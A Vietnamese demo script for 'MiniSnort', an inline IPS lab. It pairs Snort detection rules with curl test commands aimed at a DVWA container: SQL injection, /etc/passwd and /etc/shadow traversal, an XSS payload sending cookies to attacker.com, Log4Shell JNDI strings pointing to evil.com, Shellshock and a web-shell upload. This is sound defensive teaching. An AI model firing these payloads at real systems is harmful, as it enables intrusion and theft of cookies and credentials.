# Kịch Bản Demo MiniSnort IPS - End-to-End Testing

## 📋 Tổng Quan Demo
**Thời gian**: 15-20 phút  
**Mục tiêu**: Trình diễn hệ thống IPS phát hiện và chặn các cuộc tấn công mạng real-time

---

## 🎯 Phần 1: Giới Thiệu Kiến Trúc (3 phút)

### Topology
```
[Attacker] ──→ [IPS/NFQUEUE] ──→ [Victim]
10.100.0.10    10.100.0.2         10.100.0.20
```

### Thành phần:
- **Attacker**: Kali Linux container với công cụ tấn công (nmap, curl, sqlmap)
- **IPS**: MiniSnort với NFQUEUE inline mode - inspect mọi packet
- **Victim**: Ubuntu với DVWA (Damn Vulnerable Web Application)
- **Dashboard**: Real-time monitoring với Neon Cyberpunk UI

### Cơ chế hoạt động:
1. Traffic từ attacker → victim **bắt buộc** đi qua IPS (forced routing)
2. IPS dùng **iptables NFQUEUE** để intercept packets
3. MiniSnort inspect từng packet theo **rule database**
4. Action: `alert` (log + forward) hoặc `drop` (log + block)
5. Dashboard hiển thị alerts real-time qua long-polling API

---

## 🔍 Phần 2: Rule Syntax & Categories (5 phút)

### Cú pháp Snort rule:
```
action protocol src_ip src_port direction dst_ip dst_port (options)
```

### Ví dụ rule phân tích:
```snort
drop icmp any any -> any any (msg:"Block all ICMP"; sid:1000005; rev:1; classtype:drop; priority:1;)
```

**Giải thích**:
- `drop`: Chặn packet và ghi log
- `icmp`: Protocol ICMP (ping)
- `any any -> any any`: Từ bất kỳ IP:port nào đến bất kỳ đích nào
- `msg`: Thông báo hiển thị trong alert
- `sid`: Signature ID duy nhất
- `classtype`: Phân loại tấn công
- `priority`: Mức độ nghiêm trọng (1=cao, 3=thấp)

---

## 📝 Phần 3: Demo Rules Chi Tiết

### Rule Set 1: Network Reconnaissance (Trinh sát mạng)

#### Rule 1.1: ICMP Ping Detection
```snort
alert icmp any any -> any any (msg:"ICMP Ping detected"; sid:1000001; rev:1; classtype:drop; priority:1;)
```

**Mục đích**: Phát hiện ping scan - bước đầu của attacker để xác định host còn sống

**Test command**:
```bash
docker exec ms_attacker ping -c 3 10.100.0.20
```

**Kết quả mong đợi**:
- Dashboard hiển thị alert: "ICMP Ping detected"
- Packet bị drop nếu có rule 1000005
- Log ghi: `10.100.0.10:0 -> 10.100.0.20:0`

---

#### Rule 1.2: Port Scan Detection (Nmap SYN Scan)
```snort
alert tcp any any -> any any (msg:"Nmap SYN scan detected"; flags:S; threshold:type threshold, track by_src, count 10, seconds 5; sid:1000002; rev:1; classtype:attempted-recon; priority:2;)
```

**Mục đích**: Phát hiện nmap scan - attacker quét nhiều port trong thời gian ngắn

**Giải thích options**:
- `flags:S`: Chỉ match TCP SYN packets (không có ACK)
- `threshold`: Trigger khi có ≥10 SYN packets từ cùng 1 source trong 5 giây

**Test command**:
```bash
docker exec ms_attacker nmap -sS -p 1-100 10.100.0.20
```

**Kết quả mong đợi**:
- Alert sau khi scan ~10 ports
- Dashboard hiển thị: "Nmap SYN scan detected"
- Attacker IP: 10.100.0.10

---

#### Rule 1.3: OS Fingerprinting Detection
```snort
alert tcp any any -> any any (msg:"Nmap OS detection attempt"; flags:SF; sid:1000003; rev:1; classtype:attempted-recon; priority:2;)
```

**Mục đích**: Phát hiện nmap -O (OS detection) - attacker gửi packet với flag bất thường

**Test command**:
```bash
docker exec ms_attacker nmap -O 10.100.0.20
```

---

### Rule Set 2: Web Application Attacks

#### Rule 2.1: SQL Injection Detection
```snort
alert tcp any any -> any 80 (msg:"SQL Injection attempt detected"; content:"union"; nocase; content:"select"; nocase; distance:0; sid:1000004; rev:1; classtype:web-application-attack; priority:1;)
```

**Mục đích**: Phát hiện SQL injection - attacker cố gắng inject SQL query vào web app

**Giải thích options**:
- `content:"union"`: Tìm chuỗi "union" trong payload
- `nocase`: Không phân biệt hoa/thường
- `distance:0`: "select" phải xuất hiện ngay sau "union"

**Test command**:
```bash
docker exec ms_attacker curl "http://10.100.0.20/login.php?id=1' UNION SELECT username,password FROM users--"
```

**Kết quả mong đợi**:
- Alert: "SQL Injection attempt detected"
- Source: 10.100.0.10
- Destination: 10.100.0.20:80

---

#### Rule 2.2: XSS (Cross-Site Scripting) Detection
```snort
alert tcp any any -> any 80 (msg:"XSS attack detected"; content:"<script"; nocase; sid:1000006; rev:1; classtype:web-application-attack; priority:1;)
```

**Mục đích**: Phát hiện XSS - attacker inject JavaScript vào web page

**Test command**:
```bash
docker exec ms_attacker curl "http://10.100.0.20/search.php?q=<script>alert('XSS')</script>"
```

---

#### Rule 2.3: Directory Traversal Detection
```snort
alert tcp any any -> any 80 (msg:"Directory traversal attempt"; content:"../"; sid:1000007; rev:1; classtype:web-application-attack; priority:1;)
```

**Mục đích**: Phát hiện path traversal - attacker cố đọc file hệ thống

**Test command**:
```bash
docker exec ms_attacker curl "http://10.100.0.20/download.php?file=../../../../etc/passwd"
```

---

#### Rule 2.4: Admin Panel Access Attempt
```snort
alert tcp any any -> any 80 (msg:"Admin panel access attempt"; content:"/admin"; http_uri; sid:1000008; rev:1; classtype:web-application-attack; priority:2;)
```

**Mục đích**: Phát hiện truy cập admin panel - attacker tìm trang quản trị

**Test command**:
```bash
docker exec ms_attacker curl http://10.100.0.20/admin/
docker exec ms_attacker curl http://10.100.0.20/administrator/
```

---

#### Rule 2.5: SQLMap User-Agent Detection
```snort
alert tcp any any -> any 80 (msg:"SQLMap automated attack detected"; content:"User-Agent|3a| sqlmap"; sid:1000009; rev:1; classtype:web-application-attack; priority:1;)
```

**Mục đích**: Phát hiện công cụ tự động SQLMap

**Test command**:
```bash
docker exec ms_attacker curl -A "sqlmap/1.0" http://10.100.0.20/
```

---

### Rule Set 3: Known CVE Exploits

#### Rule 3.1: Log4Shell (CVE-2021-44228)
```snort
alert tcp any any -> any any (msg:"Log4Shell exploit attempt (CVE-2021-44228)"; content:"${jndi:"; nocase; sid:3542581; rev:1; classtype:attempted-admin; priority:1;)
```

**Mục đích**: Phát hiện Log4j RCE - một trong những lỗ hổng nguy hiểm nhất 2021

**Test command**:
```bash
docker exec ms_attacker curl -H "X-Api-Version: \${jndi:ldap://attacker.com/a}" http://10.100.0.20/
```

---

#### Rule 3.2: Shellshock (CVE-2014-6271)
```snort
alert tcp any any -> any 80 (msg:"Shellshock exploit attempt (CVE-2014-6271)"; content:"() {"; sid:3687504; rev:1; classtype:attempted-admin; priority:1;)
```

**Test command**:
```bash
docker exec ms_attacker curl -H "User-Agent: () { :; }; echo vulnerable" http://10.100.0.20/cgi-bin/test.sh
```

---

#### Rule 3.3: Heartbleed Detection (CVE-2014-0160)
```snort
alert tcp any any -> any 443 (msg:"Heartbleed exploit attempt (CVE-2014-0160)"; content:"|18 03|"; depth:2; content:"|01|"; distance:3; within:1; sid:3229372; rev:1; classtype:attempted-admin; priority:1;)
```

**Mục đích**: Phát hiện Heartbleed - lỗ hổng OpenSSL leak memory

---

### Rule Set 4: Malware & C2 Communication

#### Rule 4.1: Suspicious Outbound Connection
```snort
alert tcp $HOME_NET any -> $EXTERNAL_NET 4444 (msg:"Suspicious outbound connection to common backdoor port"; sid:3499347; rev:1; classtype:trojan-activity; priority:1;)
```

**Mục đích**: Phát hiện reverse shell - malware kết nối về C2 server

---

#### Rule 4.2: Cobalt Strike Beacon
```snort
alert tcp any any -> any any (msg:"Cobalt Strike beacon detected"; content:"MZ"; depth:2; content:"This program cannot be run in DOS mode"; sid:3647859; rev:1; classtype:trojan-activity; priority:1;)
```

**Mục đích**: Phát hiện Cobalt Strike - công cụ post-exploitation phổ biến

---

## 🎬 Phần 4: Kịch Bản Demo Thực Tế (7 phút)

### Scenario: Attacker tấn công web application

#### Bước 1: Reconnaissance (Trinh sát)
```bash
# Terminal 1: Mở dashboard
firefox http://127.0.0.1:8080

# Terminal 2: Attacker ping scan
docker exec ms_attacker ping -c 3 10.100.0.20
```

**Giải thích**: 
- Attacker kiểm tra victim có online không
- IPS phát hiện và log ICMP ping
- Dashboard hiển thị alert real-time

---

#### Bước 2: Port Scanning
```bash
docker exec ms_attacker nmap -sS -p 1-1000 10.100.0.20
```

**Giải thích**:
- Attacker quét 1000 ports để tìm dịch vụ đang chạy
- IPS phát hiện threshold vượt ngưỡng (>10 SYN/5s)
- Alert: "Nmap SYN scan detected"

---

#### Bước 3: Web Enumeration
```bash
docker exec ms_attacker curl http://10.100.0.20/admin/
docker exec ms_attacker curl http://10.100.0.20/administrator/
docker exec ms_attacker curl http://10.100.0.20/wp-admin/
```

**Giải thích**:
- Attacker tìm trang admin
- Mỗi request trigger rule 1000008
- Dashboard hiển thị 3 alerts liên tiếp

---

#### Bước 4: SQL Injection Attack
```bash
docker exec ms_attacker curl "http://10.100.0.20/login.php?user=admin' OR '1'='1"
docker exec ms_attacker curl "http://10.100.0.20/product.php?id=1 UNION SELECT username,password FROM users--"
```

**Giải thích**:
- Attacker thử bypass authentication
- IPS phát hiện pattern "union select"
- Alert: "SQL Injection attempt detected"

---

#### Bước 5: Directory Traversal
```bash
docker exec ms_attacker curl "http://10.100.0.20/download.php?file=../../../../etc/passwd"
docker exec ms_attacker curl "http://10.100.0.20/view.php?page=../../../../../../etc/shadow"
```

**Giải thích**:
- Attacker cố đọc file hệ thống nhạy cảm
- IPS phát hiện pattern "../"
- Alert: "Directory traversal attempt"

---

#### Bước 6: XSS Attack
```bash
docker exec ms_attacker curl "http://10.100.0.20/search.php?q=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
```

**Giải thích**:
- Attacker inject JavaScript để steal cookies
- IPS phát hiện tag "<script"
- Alert: "XSS attack detected"

---

#### Bước 7: Automated Attack (SQLMap)
```bash
docker exec ms_attacker curl -A "sqlmap/1.6.12" http://10.100.0.20/login.php
```

**Giải thích**:
- Attacker dùng công cụ tự động
- IPS phát hiện User-Agent "sqlmap"
- Alert: "SQLMap automated attack detected"

---

#### Bước 8: Exploit Known CVE (Log4Shell)
```bash
docker exec ms_attacker curl -H "X-Api-Version: \${jndi:ldap://evil.com/Exploit}" http://10.100.0.20/api/v1/status
```

**Giải thích**:
- Attacker thử khai thác Log4j RCE
- IPS phát hiện pattern "${jndi:"
- Alert: "Log4Shell exploit attempt (CVE-2021-44228)"
- **Priority 1** - Nguy hiểm cao nhất!

---

## 📊 Phần 5: Dashboard Features Demo (3 phút)

### 5.1: Real-time Alert Feed
- Mở dashboard: http://127.0.0.1:8080
- Chạy attack commands
- Quan sát alerts xuất hiện real-time (long-polling mỗi 2s)

### 5.2: Alert Details
Mỗi alert hiển thị:
- **Timestamp**: Thời gian chính xác
- **SID**: Rule ID (click để xem rule detail)
- **Message**: Mô tả tấn công
- **Source → Destination**: IP:Port
- **Protocol**: TCP/UDP/ICMP
- **Action**: alert/drop
- **Priority**: 1 (high) → 3 (low)

### 5.3: Rule Management
- Click "Rules" tab
- Xem 14 rules đang active
- Edit rule inline (text mode hoặc list mode)
- Save → IPS reload rules tự động

### 5.4: Statistics
- Total alerts: Tổng số tấn công phát hiện
- Rules loaded: 14 active rules
- Connection status: Live/Offline
- Alert feed size: 2000 bytes

---

## 🛠️ Phần 6: Rule Writing Workshop (5 phút)

### Bài tập: Viết rule phát hiện SSH Brute Force

**Yêu cầu**: 
- Phát hiện >5 SSH login attempts trong 60 giây
- Port 22
- Priority 1

**Solution**:
```snort
alert tcp any any -> any 22 (msg:"SSH brute force attempt"; flags:S; threshold:type threshold, track by_src, count 5, seconds 60; sid:2000001; rev:1; classtype:attempted-user; priority:1;)
```

**Test**:
```bash
for i in {1..10}; do
  docker exec ms_attacker nc -zv 10.100.0.20 22
done
```

---

### Bài tập 2: Phát hiện Cryptocurrency Mining

**Yêu cầu**:
- Phát hiện kết nối đến mining pool
- Port 3333, 4444, 5555
- Keyword: "stratum"

**Solution**:
```snort
alert tcp any any -> any [3333,4444,5555] (msg:"Cryptocurrency mining detected"; content:"stratum"; sid:2000002; rev:1; classtype:policy-violation; priority:2;)
```

---

## 📈 Phần 7: Performance & Metrics (2 phút)

### Kiểm tra IPS performance:
```bash
# NFQUEUE packet counter
docker exec ms_ips iptables -L FORWARD -n -v

# Minisnort logs
docker exec ms_ips tail -f /var/log/minisnort/alert.log

# Dashboard API
curl -s http://127.0.0.1:8080/api/status | jq
```

### Metrics hiển thị:
- **Packets inspected**: Số packet đã inspect
- **Alerts generated**: Số alerts đã tạo
- **Drop rate**: % packet bị drop
- **Latency**: Thời gian xử lý trung bình

---

## 🎯 Phần 8: Q&A & Wrap-up (3 phút)

### Câu hỏi thường gặp:

**Q1: IPS có làm chậm network không?**
A: Có, nhưng minimal. NFQUEUE + inline inspection thêm ~1-5ms latency.

**Q2: False positive xử lý thế nào?**
A: Tune rule threshold, whitelist trusted IPs, adjust sensitivity.

**Q3: Có thể block toàn bộ attacker IP không?**
A: Có, thêm rule:
```snort
drop ip 10.100.0.10 any -> any any (msg:"Blacklist attacker IP"; sid:9000001; rev:1;)
```

**Q4: Scale cho production thế nào?**
A: 
- Dùng Suricata (multi-threaded) thay Snort
- Hardware acceleration (DPDK, AF_PACKET)
- Distributed IPS cluster

---

## 📝 Checklist Demo

### Trước demo:
- [ ] `docker compose up -d` - Start all containers
- [ ] `docker logs ms_ips` - Verify minisnort running
- [ ] `curl http://127.0.0.1:8080` - Dashboard accessible
- [ ] Clear old alerts: `docker exec ms_ips truncate -s 0 /var/log/minisnort/alert.log`

### Trong demo:
- [ ] Mở dashboard trên projector
- [ ] Terminal sẵn sàng với attacker commands
- [ ] Giải thích từng rule trước khi test
- [ ] Highlight alerts trên dashboard real-time

### Sau demo:
- [ ] Show rule editor feature
- [ ] Export alerts: `docker exec ms_ips cat /var/log/minisnort/alert.log > demo_alerts.txt`
- [ ] Q&A session

---

## 🚀 Bonus: Advanced Scenarios

### Scenario 1: Multi-stage Attack
```bash
# Stage 1: Recon
docker exec ms_attacker nmap -sS 10.100.0.20

# Stage 2: Exploit
docker exec ms_attacker curl "http://10.100.0.20/login.php?user=admin' OR '1'='1"

# Stage 3: Privilege Escalation
docker exec ms_attacker curl "http://10.100.0.20/upload.php" -F "file=@shell.php"

# Stage 4: Data Exfiltration
docker exec ms_attacker curl "http://10.100.0.20/shell.php?cmd=cat /etc/passwd"
```

**Dashboard sẽ hiển thị chuỗi alerts theo timeline → Visualize attack chain**

---

### Scenario 2: DDoS Simulation
```bash
# Flood ICMP
docker exec ms_attacker bash -c 'for i in {1..100}; do ping -c 1 10.100.0.20 & done'
```

**IPS sẽ trigger threshold rule và drop excess traffic**

---

## 📚 Tài Liệu Tham Khảo

- Snort Rule Writing Guide: https://docs.snort.org/
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- CVE Database: https://cve.mitre.org/
- MiniSnort GitHub: (your repo URL)

---

**Kết thúc demo - Cảm ơn đã theo dõi! 🎉**
